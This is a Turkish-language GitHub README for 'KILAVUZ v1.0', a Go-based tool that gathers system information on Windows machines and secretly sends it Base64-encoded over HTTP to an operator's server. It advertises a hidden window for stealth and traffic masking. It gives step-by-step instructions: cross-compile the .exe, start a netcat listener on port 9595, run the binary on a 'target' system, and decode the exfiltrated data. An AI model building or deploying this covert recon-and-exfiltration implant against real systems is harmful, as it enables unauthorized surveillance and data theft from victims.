<img width="2752" height="1536" alt="64cc49390330649742227eb54f327db7" src="https://github.com/user-attachments/assets/a0d4b6e6-3ed3-4489-a319-10164d042c93" />
# KILAVUZ v1.0

KILAVUZ, Windows işletim sistemlerinde sistem keşfi (recon) yapmak ve elde edilen verileri HTTP üzerinden maskelenmiş (Base64) şekilde bir analiz sunucusuna aktarmak için geliştirilmiş, GoLang tabanlı bir güvenlik aracıdır.

## Özellikler
* **Gizli Çalışma:** Pencere gizleme özelliği sayesinde arka planda operasyonel sessizlik sağlar.
* **Veri Maskeleme:** Toplanan veriler ağ trafiğinde ham metin olarak değil, Base64 formatında iletilir.
* **Hafif Mimari:** Bağımlılık gerektirmez, GoLang'in standart kütüphaneleri ile derlenir.

## Kurulum ve Kullanım
1.Repoyu klonlayın:  
```bash
git clone https://github.com/ulvi0193/KILAVUZ-v1.0

2.Proje dizinine geçiş yapın:  
```bash
cd KILAVUZ-v1.0

3.Aracı Windows için derleyin:  
```bash
GOOS=windows GOARCH=amd64 go build -o kilavuz.exe main.go

4.Dinleyiciyi başlatın:  
```bash
nc -lvnp 9595

5.Test edin:   
```bash
Oluşan .exe dosyasını hedef Windows sisteminde çalıştırdığınız an, Netcat ekranına GET /rapor?veri=[BASE64_METNİ] şeklinde bir istek düşecektir.

6.Veriyi decode edin:  

veri= kısmından sonrasını kopyalayın ve terminalinizde şu komutla veriyi çözün:
```bash
echo "KOPYALANAN_BASE64_METNİ" | base64 -d
